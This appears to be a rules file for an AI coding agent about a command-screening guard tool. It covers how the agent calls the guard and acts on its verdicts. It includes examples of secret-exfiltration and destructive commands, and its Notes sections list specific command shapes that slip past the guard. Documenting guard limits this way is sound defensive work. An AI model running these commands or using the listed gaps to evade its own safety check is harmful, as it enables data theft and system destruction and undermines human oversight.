# jev-command-guard

Run the command through `kit_guard_command` first whenever it could be destructive, exfiltrate or print a secret, change something outside the working directory, or touch another machine. Skip it for plainly read-only commands (`ls`, `git status`, `rg`, `cat README.md`, test and build runs).

If a `kit_guard_command` PreToolUse hook is already installed it calls the same tool on every Bash/Read, so you can skip manual calls on commands that pass through it — but it is not equivalent: it fails open on a 2 s Jev timeout, never blocks in `JEV_GUARD_MODE=shadow`, can let `ask` through when `JEV_GUARD_ASK_NO_UI=allow`, and covers Bash, Read and NotebookRead only. Keep calling the tool for anything risky outside those shapes or when you can't see the hook's mode.

**What this actually is.** The deterministic rules are a fast first layer over the command's own text — string and regex matching, not a shell interpreter, not a sandbox. They catch unreviewed, routine, mistake-shaped commands well, and three rounds of adversarial review against this exact matcher have already closed many real gaps — most recently a shared `bash -c`/`sh -c`/`eval`/`xargs`-indirection canonicalization layer every rule now goes through (closing a dozen independent per-rule wrapper bypasses at once, rather than patching each one separately), curl/wget/httpie's own attached-option upload syntax, a `.`/`..`-segment path-normalization gap on `rm`/`chmod`/`dd`, and a versioned-interpreter-name gap (`python3.11` going unrecognized as `python3`). None of that changes the category: a command text deliberately engineered to defeat a string matcher generally will. It still cannot see a script piped into a shell's stdin rather than passed as a `-c` argument (`base64 -d <<< ... | bash`), a shell alias or function defined earlier in the same session that silently redefines what `rm`/`curl`/`cat` actually runs, or a script written to disk in one step and executed as a separate command (so the dangerous content never appears in one judged string at all). Treat a `kit_guard_command` `allow` as "nothing matched," never as "this command was sandboxed" — for anything genuinely adversarial, the guard is not the control that stops it.

## Call

Tool: `kit_guard_command` on the `jev` MCP server (Claude Code names it `mcp__jev__kit_guard_command`).
If MCP is not wired up, use the shell helper: `jev-call kit_guard_command '<json>'`.

Arguments (only `command` is required):
```json
{"command": "scp db.dump prod:/tmp", "cwd": "<current dir>", "home": "<$HOME>", "description": "<why, if you know>"}
```
- For a file read use `{"tool":"Read","file_path":"..."}`.
- Optional `user_request`: the user's own words asking for this action. It can only soften an `ask` to `allow`, never a `block`. Quote the user; never invent it.
- Optional `ask_at` (0-1, default 0.65): risk at or above which you get `ask`.

## Act on `decision`

| decision | what you do |
|---|---|
| `allow` | Run it — but read this as "no rule matched, no opinion", not "proven safe". Prefilter misses some obfuscated secrets and dangerous shapes it hasn't been taught (see Notes), so keep your own judgment for anything destructive. |
| `ask` | Do not run it yet. Tell the user what the command does and the `reason`, and wait for an explicit yes. If they approve, run it (or re-call with their words in `user_request`). In a host with no UI to ask through (e.g. an omp hook), `ask` resolves to `block`. |
| `block` | Do not run it. Read `rule`, `reason` and `suggestion`, then take the suggested safer route (for example load `.env` into the environment instead of printing it, or instead of uploading it). Covers: secret reads/exposure (`R1-secret-exposure`), secret exfiltration — a secret file piped or uploaded to a network destination (`R1-secret-exfiltration`: `curl -d @.env`, `scp id_rsa user@host:`, `cat .env \| curl ...`), `sudo` outside a named package install (`R5-sudo`), a recursive delete of `/` or `$HOME`, incl. an unguarded `rm -rf $VAR/` (`R7-root-delete`), a raw-device write or whole-tree permission change (`R7-irreversible`: `dd of=/dev/sdX`, `chmod -R` on `/` or `~`), and committing a real-looking credential (`R9-commit-secret`). Never retry the same command reworded, quoted, split up or base64-encoded to get past the guard. |

## Notes
- `decided_by: "prefilter"` means a deterministic rule fired and no model was called (secret reads/exfiltration, `rm -rf ~`, `sudo`, raw-device writes, staging secrets). `decided_by: "jev"` means the Jev model scored it; `score` is then 0-1 — P(moderate-or-worse) risk, or P(it prints a secret) on a secret-path call. `kubectl delete`/`drain`/`cordon`/`scale --replicas=0`, `terraform`/`tofu apply -auto-approve`, `pulumi destroy`, and `helm uninstall` are `ask`-tier (Jev-scored or deterministic `R7-destructive`), not `block` — destroying infrastructure or cluster state is sometimes exactly what was asked for, so it pauses for confirmation rather than refusing outright.
- If `jev.status` shows Jev is unavailable, the server fails open (`allow`, `decided_by: "fail_open"`, `score: null`, plus a note). Treat that as "no opinion", and use normal caution for anything destructive.
- `disable_rules` exists but only the user may decide to use it.
- Never put a secret value in `command` (or `file_path`): the full text goes to the MCP server, and when Jev is consulted a **redacted, truncated** copy goes upstream to the model API (`redactCap` in the server). Even redacted, don't paste secrets — refer to files.
- **Known remaining limits, stated honestly**: the prefilter is pattern-based, not a real shell parser. It does not understand embedded shell functions, aliases, exotic shells (fish/pwsh) beyond the common ones, or interpreters reading a secret path from anywhere other than a `-c`/`-e` inline script's own *literal string* (a script loaded from a *file* that reads a secret isn't inspected, and neither is a path built at runtime — `sys.argv[1]`, string concatenation/f-strings, a path read from an env var inside the script). Bare `printenv` with no arguments always blocks (dumping the whole environment risks a sourced secret), even though most real uses are benign debugging — if that's wrong for your case, say so and the `block` can be worked around with the suggested `set -a; . ./.env; set +a` pattern instead of printing. A bulk/recursive remote copy of a whole directory (`scp -r . user@host:/backup/`, `rsync -a ./ user@host:/srv/app`) is not scanned for a secret file it might contain — exfiltration detection only matches a source argument that itself names a known secret path, not an arbitrary directory that could hold one; name the file explicitly if you need it flagged. A secret piped through `xargs` into a network sink is caught when the secret's own content is the argument (`cat .env | xargs -I{} curl -d {} ...`), but not when a *different* command (`find`, `grep -l`) discovers the secret's *path* and `xargs`/a placeholder substitutes that path into the sink at runtime (`find . -name .env | xargs -I{} curl -d @{} ...`) — the actual path never appears as a literal in the command text for this guard to match against. Wrapper unwrapping is one shared argv walk (`peelCommand`/`resolveCommand`/`scriptOf`/`inputScripts` in `server/src/kit/shell.mjs`): `bash -c`/`sh -c`/`eval`, xargs/parallel/find -exec's invoked argv, su/runuser -c, ssh's remote command, env -S/--split-string, tmux/capsh script operands, interp -c/-e/--eval/-r payloads (plus shell-looking string literals inside them), and every execution-prefix wrapper (env/timeout/nice/ionice/stdbuf/taskset/chrt/sudo/doas/pkexec/setsid/busybox/nohup/command/builtin/watch/unshare/nsenter/setpriv/chpst/flatpak-spawn/systemd-run/firejail/chroot/proxychains/fakeroot/eatmydata/flock/strace/ltrace/unbuffer/xvfb-run/script/sg/numactl/prlimit/cgexec/dbus-run-session/setarch/torsocks/`ip netns exec`/`time -p`) and shell keyword/grouping marker — capped at 3 layers: payloads nested deeper than 3 `-c` wrappers are NOT unwrapped at all and reach no rule (a deliberate bound against unbounded re-parsing, pinned by test). Heredocs/here-strings feeding a script executor (`sh`, `bash -s`, interp, at/batch/crontab, ssh's remote shell, xargs/parallel/find -exec's executor) are unwrapped the same way; a heredoc into a file or non-executor stays data. A command word built from a literal-printing substitution or a literal-assigned variable within the same script (`$(echo rm) -rf /`, `` `echo rm` -rf / ``, `$(printf rm) -rf ~`, `x=rm; $x -rf /`) is folded to its literal text before any rule reads it; a command word whose value is computed at runtime (`$(cat cmd.txt) -rf /`, a value from the environment or stdin) stays opaque. And code that never exists as literal text — a script fetched at runtime (`$(curl x.sh)`, `` `curl x.sh` ``), `sh <(curl x.sh)`/process-substitution payloads, an `os.system()` call whose command is BUILT (variables/concatenation, not a string literal), a backticked operand's quoting ambiguity — is invisible to a string-matching layer by definition: the dangerous content only materializes when the command runs. Treat every `allow` as "nothing matched", not a guarantee, especially for a command shape not listed above.
- **Exec-wrapper coverage is a maintained list, not an exhaustive one.** The commands peeled to reach the program they run (`WRAPPER_SPECS` in `server/src/kit/shell.mjs`: `sudo`, `timeout`, `nice`, `chroot`, `flock`, `strace`, `script`, `runuser`, `setarch`, and so on) cover the common ones. A wrapper that runs its operand as the command but is missing from that list is not peeled, so its operand is read as the program and the rules miss it. Adding one means adding a spec and a round-level regression test.
- **Round-7 disclosed limits** (PR #30 review comment 6478423439, reviewed at `00064f7`). Fixed and tested: the items listed in `RESULTS.md`. Still open, disclosed rather than fixed:
  - **Symlinks are lexical.** Only an `ln -s` created earlier in the same command is resolved. A link already on disk (`rm -rf link/` where `link -> /`) is not. The guard does no filesystem access, so this stays a limit.
  - **`zpool destroy <pool-name>`** with no device operand is not classified. `zpool create|add|labelclear`, `mdadm --create|--zero-superblock`, and `blkdiscard` block when a block device is named.
  - **Not blocked:** an unset-variable prefix (`${x}rm -rf /`); `r$(echo m)$(echo ' ') -rf /`; `useradd -o -u 0`; `usermod -u 0`; `chmod 777 /etc/passwd`; `userdel -r`; `apt remove --purge base-files`; `dpkg --purge --force-all`; `pacman -Rns --noconfirm glibc`; `mv ~ /tmp/x`; `truncate -s0 ~/.bashrc`; `shred -u` on a non-secret path; `printf 'rm -rf /' > s.sh; sh s.sh`.
  - **Fail-open (R10):** `find / -delete`, `systemctl stop sshd`, `: > ~/.bashrc`, and `rsync --delete` are not blocked.
  - **xargs verdict change (needs owner sign-off):** `echo / | xargs -I{} rm -rf {}` and the `bash -c`/`sh -c` forms now block R7-root-delete, because the body is a literal. An opaque body (`cat list | xargs -I{} rm -rf {}`) still asks.
- **Round-9 changes** (PR #30 review comment 6479022096, reviewed at `6a7889a`): cwd `rm -rf .*` and `rm -rf .[!.]*` ask like `rm -rf *`; `~/.*`, `~/.[!.]*`, and `/.*` block like `~/*` and `/*`; a secret-named variable with a trailing `_PASS`, `_PWD`, `_ROLE`, or `_CRED`/`_CREDS` component blocks as R1-secret-exposure. Disclosed: the substring terms (`PASSWORD`, `TOKEN`, etc.) still match inside longer names such as `PASSWORDLESS_MODE`.
